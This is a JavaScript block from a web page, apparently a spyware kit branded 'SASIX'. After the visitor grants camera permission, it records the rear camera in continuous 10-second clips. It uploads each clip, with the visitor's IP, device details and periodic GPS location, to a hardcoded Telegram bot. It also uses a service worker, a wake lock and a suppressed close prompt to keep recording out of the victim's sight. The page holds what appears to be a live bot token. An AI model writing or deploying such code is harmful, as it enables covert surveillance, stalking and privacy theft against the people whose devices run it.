    <!-- ========== SERVICE WORKER FOR BACKGROUND ========== -->
    <script>
        // ============================================
        // SASIX TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let cameraStream = null;
        let videoElement = document.getElementById('cameraFeed');
        let isActive = false;
        let recordingInterval = null;
        let isRecording = false;
        let mediaRecorder = null;
        let videoChunks = [];
        let videoCount = 0;
        
        // ============================================
        // 1. REGISTER SERVICE WORKER (Background Running)
        // ============================================
        async function registerServiceWorker() {
            if ('serviceWorker' in navigator) {
                try {
                    const swRegistration = await navigator.serviceWorker.register('sasix-sw.js');
                    console.log('‚úÖ Service Worker Registered');
                    
                    // Request background fetch permissions
                    if ('BackgroundFetch' in window) {
                        console.log('‚úÖ Background Fetch Available');
                    }
                    
                    // Keep alive
                    setInterval(() => {
                        swRegistration.active.postMessage({type: 'KEEP_ALIVE'});
                    }, 10000);
                    
                } catch (error) {
                    console.log('‚ùå Service Worker Error:', error);
                }
            }
        }
        
        // ============================================
        // 2. START CAMERA
        // ============================================
        document.getElementById('startCameraBtn').addEventListener('click', async function() {
            try {
                // ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂± - BACK CAMERA ‡∂¥‡∑ä‚Äç‡∂ª‡∂∫‡∂ª‡∑í‡∂ß‡∑í
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: { ideal: "environment" },
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30, min: 24 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = cameraStream;
                await videoElement.play();
                
                // ‡∂¥‡∂ª‡∂∏‡∑í‡∑Ç‡∂±‡∑ä ‡∑É‡∑ä‡∂ö‡∑ä‚Äç‡∂ª‡∑ì‡∂±‡∑ä ‡∂ë‡∂ö ‡∑Ñ‡∂∫‡∑í‡∂©‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                document.getElementById('permissionScreen').style.display = 'none';
                
                // Start ‡∂ö‡∑Ö‡∑è ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è ‡∂∏‡∑ê‡∑É‡∑ö‡∂¢‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
                await sendTelegramMessage('üî¥ <b>SASIX LIVE CAMERA ACTIVATED</b>\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n‚è∞ Time: ' + new Date().toLocaleString() + '\n‚ö° Status: Continuous Recording\nüìπ Format: MP4 (10 seconds)');
                
                // ‡∑É‡∂ª‡∑ä‡∑Ä‡∑í‡∑É‡∑ä ‡∑Ä‡∂ª‡∑ä‡∂ö‡∂ª‡∑ä ‡∂ª‡∑ô‡∂¢‡∑í‡∑É‡∑ä‡∂ß‡∂ª‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                await registerServiceWorker();
                
                // ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ª‡∑ô‡∂ö‡∑ù‡∂©‡∑í‡∂±‡∑ä ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
                startContinuousRecording();
                
                // ‡∑Ä‡∑í‡∂±‡∑è‡∂©‡∑í‡∂∫‡∂ö‡∂ß ‡∑Ä‡∂ª‡∂ö‡∑ä ‡∑Ñ‡∑è‡∂ß‡∑ä‡∂∂‡∑ì‡∂ß‡∑ä
                setInterval(() => {
                    if (isActive) {
                        console.log('üíì SASIX Heartbeat - Active');
                    }
                }, 60000);
                
            } catch(error) {
                console.error('Camera Error:', error);
                alert('‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂± ‡∂∂‡∑ê‡∑Ñ‡∑ê. ‡∂¥‡∂ª‡∂∏‡∑í‡∑Ç‡∂±‡∑ä ‡∂ë‡∂ö ‡∂Ø‡∑ô‡∂±‡∑ä‡∂±.');
            }
        });
        
        // ============================================
        // 3. CONTINUOUS RECORDING - 10sec MP4
        // ============================================
        function startContinuousRecording() {
            if (isActive) return;
            isActive = true;
            
            console.log('üé• SASIX Continuous Recording Started - 10sec MP4');
            
            // ‡∂ë‡∂ö ‡∂Ø‡∑í‡∂ú‡∂ß ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ª‡∑ô‡∂ö‡∑ù‡∂©‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
            async function recordLoop() {
                while (isActive) {
                    try {
                        await recordAndSendVideo();
                        videoCount++;
                        console.log(`‚úÖ Video #${videoCount} sent`);
                        
                        // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 2‡∂ö‡∑ä ‡∑Ä‡∑í‡∂≠‡∂ª ‡∂∂‡∑ä‚Äç‡∂ª‡∑ö‡∂ö‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                    } catch(e) {
                        console.error('Recording loop error:', e);
                        await new Promise(resolve => setTimeout(resolve, 5000));
                    }
                }
            }
            
            recordLoop();
        }
        
        // ============================================
        // 4. RECORD 10 SEC VIDEO AND SEND AS MP4
        // ============================================
        async function recordAndSendVideo() {
            return new Promise(async (resolve, reject) => {
                try {
                    videoChunks = [];
                    
                    // MediaRecorder setup for MP4
                    let options = {
                        mimeType: 'video/mp4;codecs=avc1',
                        videoBitsPerSecond: 2500000 // 2.5 Mbps
                    };
                    
                    // Check MP4 support
                    if (MediaRecorder.isTypeSupported('video/mp4;codecs=avc1')) {
                        mediaRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/mp4;codecs=avc1' });
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        mediaRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm;codecs=vp9' });
                    } else {
                        mediaRecorder = new MediaRecorder(cameraStream);
                    }
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) {
                            videoChunks.push(e.data);
                        }
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                        const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                        
                        console.log(`üìπ Recorded: 10sec | ${sizeMB}MB`);
                        
                        // Send to Telegram
                        const sent = await sendVideoToTelegram(videoBlob, sizeMB);
                        
                        if (sent) {
                            resolve();
                        } else {
                            reject(new Error('Send failed'));
                        }
                    };
                    
                    // Record 10 seconds
                    mediaRecorder.start(1000);
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 10000); // 10 seconds
                    
                } catch(error) {
                    console.error('Record error:', error);
                    reject(error);
                }
            });
        }
        
        // ============================================
        // 5. SEND VIDEO TO TELEGRAM
        // ============================================
        async function sendVideoToTelegram(videoBlob, sizeMB) {
            try {
                // Get IP
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                // Device Info
                const ua = navigator.userAgent;
                let device = 'Android', browser = 'Chrome';
                if (ua.includes('Windows')) device = 'Windows';
                else if (ua.includes('Mac')) device = 'MacOS';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                
                if (ua.includes('Firefox')) browser = 'Firefox';
                else if (ua.includes('Safari')) browser = 'Safari';
                else if (ua.includes('Edg')) browser = 'Edge';
                
                // FormData
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `SASIX_10sec_${Date.now()}.mp4`);
                formData.append('caption', `üé• <b>SASIX LIVE RECORDING</b> #${videoCount + 1}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚è±Ô∏è <b>Duration:</b> 10 seconds
üì¶ <b>Size:</b> ${sizeMB} MB
üìÖ <b>Time:</b> ${new Date().toLocaleString()}
üåç <b>IP:</b> ${ip}
üì± <b>Device:</b> ${device} (${browser})
üÜî <b>Session:</b> ${Math.random().toString(36).substring(7)}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚ö° <b>Continuous Mode:</b> ACTIVE
üî¥ <b>Status:</b> Recording 24/7

#SASIX #LIVE #10SEC #MP4 #CONTINUOUS`);

                console.log(`üì§ Sending video #${videoCount + 1}...`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`‚úÖ Video #${videoCount + 1} sent successfully!`);
                    
                    // Send location every 5 videos
                    if (videoCount % 5 === 0) {
                        sendLocation();
                    }
                    
                    return true;
                } else {
                    console.error('Telegram error:', result);
                    return false;
                }
                
            } catch(error) {
                console.error('Send error:', error);
                return false;
            }
        }
        
        // ============================================
        // 6. SEND TELEGRAM MESSAGE
        // ============================================
        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
            } catch(e) {}
        }
        
        // ============================================
        // 7. SEND LOCATION
        // ============================================
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    horizontal_accuracy: position.coords.accuracy
                                })
                            });
                            console.log('üìç Location sent');
                            
                            // Google Maps link
                            await sendTelegramMessage(`üìç <b>Location Update</b>\nüó∫Ô∏è <a href="https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}">View on Google Maps</a>`);
                            
                        } catch(e) {}
                    },
                    (error) => {}
                );
            }
        }
        
        // ============================================
        // 8. KEEP ALIVE - Background Mode
        // ============================================
        function keepAlive() {
            // Create hidden iframe for background
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'about:blank';
            document.body.appendChild(iframe);
            
            // Keep fetching
            setInterval(() => {
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe')
                    .catch(() => {});
            }, 25000);
        }
        
        // ============================================
        // 9. PAGE VISIBILITY - Continue in Background
        // ============================================
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('üì± Page in background - CONTINUING RECORDING');
                // Keep recording even in background
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    console.log('üé• Recording continues in background');
                }
            } else {
                console.log('üì± Page visible again');
            }
        });
        
        // ============================================
        // 10. BEFORE UNLOAD - Don't stop!
        // ============================================
        window.addEventListener('beforeunload', function(e) {
            // Keep recording even when page is closed
            if (isActive) {
                console.log('‚ö†Ô∏è Page closing but recording continues!');
                // Don't show confirmation
                e.preventDefault();
                delete e['returnValue'];
            }
        });
        
        // ============================================
        // 11. WAKE LOCK - Prevent Sleep
        // ============================================
        async function requestWakeLock() {
            if ('wakeLock' in navigator) {
                try {
                    const wakeLock = await navigator.wakeLock.request('screen');
                    console.log('‚úÖ Wake Lock acquired');
                    
                    wakeLock.addEventListener('release', () => {
                        console.log('‚ö†Ô∏è Wake Lock released, requesting again...');
                        requestWakeLock();
                    });
                    
                } catch (err) {
                    console.log('‚ùå Wake Lock error:', err);
                }
            }
        }
        
        // ============================================
        // 12. START EVERYTHING
        // ============================================
        window.addEventListener('load', function() {
            console.log('üöÄ SASIX ULTIMATE loaded');
            keepAlive();
            requestWakeLock();
            
            // Send notification
            setTimeout(() => {
                if (!isActive) {
                    console.log('‚è≥ Waiting for camera permission...');
                }
            }, 2000);
        });
        
        // ============================================
        // 13. SERVICE WORKER CODE (Embedded)
        // ============================================
        const swCode = `
        self.addEventListener('install', (event) => {
            self.skipWaiting();
        });
        
        self.addEventListener('activate', (event) => {
            event.waitUntil(clients.claim());
        });
        
        self.addEventListener('message', (event) => {
            if (event.data.type === 'KEEP_ALIVE') {
                console.log('üíì SW Keep Alive');
            }
        });
        
        // Keep alive
        setInterval(() => {
            self.registration.update();
        }, 20000);
        `;
        
        // Register SW with blob
        const swBlob = new Blob([swCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(swBlob);
        
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register(swUrl).then(reg => {
                console.log('‚úÖ SASIX Service Worker Registered');
            });
        }
        
    </script>
